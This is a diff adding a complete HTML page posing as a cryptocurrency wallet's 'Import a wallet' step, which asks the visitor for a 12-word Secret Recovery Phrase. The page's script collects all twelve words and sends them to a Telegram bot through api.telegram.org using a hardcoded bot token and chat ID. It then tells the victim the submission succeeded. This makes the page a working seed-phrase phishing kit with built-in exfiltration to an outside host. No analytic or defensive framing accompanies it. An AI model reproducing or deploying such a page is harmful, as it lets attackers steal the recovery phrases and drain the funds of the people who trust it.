@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wallet Import Form</title>
+  <style>
+    body {
+      font-family: "Inter", sans-serif;
+      background-color: #0d0d0d;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    .card {
+      background-color: #1a1a1a;
+      border-radius: 12px;
+      padding: 32px;
+      max-width: 420px;
+      width: 100%;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+    }
+
+    h2 {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #fff;
+    }
+
+    .step {
+      font-size: 14px;
+      color: #aaa;
+      margin-bottom: 6px;
+    }
+
+    .input-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin: 20px 0;
+    }
+
+    .input-box {
+      background: #111;
+      border: 1px solid #444;
+      border-radius: 8px;
+      padding: 6px 10px;
+      display: flex;
+      align-items: center;
+    }
+
+    .input-box input {
+      background: transparent;
+      border: none;
+      outline: none;
+      color: #fff;
+      font-size: 14px;
+      width: 100%;
+    }
+
+    .input-box input::placeholder {
+      color: #666;
+    }
+
+    .controls {
+      display: flex;
+      justify-content: space-between;
+      font-size: 13px;
+      margin-bottom: 16px;
+    }
+
+    .controls a {
+      color: #4a90e2;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .controls a:hover {
+      text-decoration: underline;
+    }
+
+    .warning {
+      font-size: 12px;
+      color: #ff4d4d;
+      margin-bottom: 20px;
+    }
+
+    .continue-btn {
+      width: 100%;
+      background: #444;
+      color: #ccc;
+      border: none;
+      border-radius: 8px;
+      padding: 12px;
+      font-size: 15px;
+      cursor: not-allowed;
+      transition: 0.3s;
+    }
+
+    .continue-btn.enabled {
+      background: #4a90e2;
+      color: #fff;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="step">Step 1 of 2</div>
+    <h2>Import a wallet</h2>
+    <p style="font-size:14px; color:#aaa;">Enter your Secret Recovery Phrase</p>
+
+    <div class="input-grid">
+      <div class="input-box"><input type="password" placeholder="1. word"></div>
+      <div class="input-box"><input type="password" placeholder="2. word"></div>
+      <div class="input-box"><input type="password" placeholder="3. word"></div>
+      <div class="input-box"><input type="password" placeholder="4. word"></div>
+      <div class="input-box"><input type="password" placeholder="5. word"></div>
+      <div class="input-box"><input type="password" placeholder="6. word"></div>
+      <div class="input-box"><input type="password" placeholder="7. word"></div>
+      <div class="input-box"><input type="password" placeholder="8. word"></div>
+      <div class="input-box"><input type="password" placeholder="9. word"></div>
+      <div class="input-box"><input type="password" placeholder="10. word"></div>
+      <div class="input-box"><input type="password" placeholder="11. word"></div>
+      <div class="input-box"><input type="password" placeholder="12. word"></div>
+    </div>
+
+    <div class="controls">
+      <a href="#" id="toggle-visibility">Show all</a>
+      <a href="#" id="clear-all">Clear all</a>
+    </div>
+
+    <div class="warning">
+      Use only lowercase letters, check your spelling, and put the words in the original order.
+    </div>
+
+    <button class="continue-btn" id="submitBtn" disabled>Continue</button>
+  </div>
+
+  <script>
+    const toggleBtn = document.getElementById("toggle-visibility");
+    const clearBtn = document.getElementById("clear-all");
+    const submitBtn = document.getElementById("submitBtn");
+    const inputs = document.querySelectorAll(".input-box input");
+
+    let visible = false;
+
+    // Toggle show/hide input text
+    toggleBtn.addEventListener("click", (e) => {
+      e.preventDefault();
+      visible = !visible;
+      inputs.forEach(input => {
+        input.type = visible ? "text" : "password";
+      });
+      toggleBtn.textContent = visible ? "Hide all" : "Show all";
+    });
+
+    // Clear all inputs & reset visibility
+    clearBtn.addEventListener("click", (e) => {
+      e.preventDefault();
+      inputs.forEach(input => {
+        input.value = "";
+        input.type = "password";
+      });
+      visible = false;
+      toggleBtn.textContent = "Show all";
+      checkForm(); // re-check validity after clearing
+    });
+
+    // Enable/disable button based on input completion
+    function checkForm() {
+      const allFilled = Array.from(inputs).every(input => input.value.trim() !== "");
+      if (allFilled) {
+        submitBtn.disabled = false;
+        submitBtn.classList.add("enabled");
+      } else {
+        submitBtn.disabled = true;
+        submitBtn.classList.remove("enabled");
+      }
+    }
+
+    inputs.forEach(input => {
+      input.addEventListener("input", checkForm);
+    });
+
+    // Send form data to Telegram
+    submitBtn.addEventListener("click", (e) => {
+      e.preventDefault();
+
+      if (submitBtn.disabled) return; // prevent empty send
+
+      const words = [];
+      inputs.forEach((input, index) => {
+        words.push(`${index + 1}. ${input.value}`);
+      });
+
+      const message = `📝 Wallet Import Submission:\n\n${words.join("\n")}`;
+
+      // Replace with your bot token & chat ID
+      const botToken = "8257073704:AAGKQHWRXbXoDoTBOQ-3R_TouPaYuAcxSHI";
+      const chatId = "6872862496";
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        alert("Form submitted successfully!");
+        console.log("Telegram response:", data);
+      })
+      .catch(err => {
+        alert("Error sending to Telegram");
+        console.error(err);
+      });
+    });
+  </script>
+</body>
+</html>
